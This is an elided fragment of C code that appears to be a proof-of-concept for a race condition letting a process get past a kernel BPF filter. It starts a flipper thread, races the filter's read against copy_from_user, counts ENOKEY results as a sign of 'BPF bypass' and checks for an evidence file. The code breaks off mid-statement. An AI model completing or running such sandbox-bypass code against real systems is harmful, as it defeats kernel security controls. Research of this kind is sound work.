...
int main(int argc, char **argv)
{
         ...
         */
        {
                ...
                pthread_t tid;
                pthread_create(&tid, NULL, flipper_thread, NULL);

                fprintf(stderr, "[toctou] Racing BPF read vs kernel copy_from_user (%d iters)...\n",
                        RACE_ITERS);
                ...
                if (enokey_cnt > 0)
                        fprintf(stderr, "[*] Got %d ENOKEY — BPF bypass happened but kernel saw xifs too\n",
                                enokey_cnt);
                if (access(EVIDENCE_PATH, F_OK) == 0) {
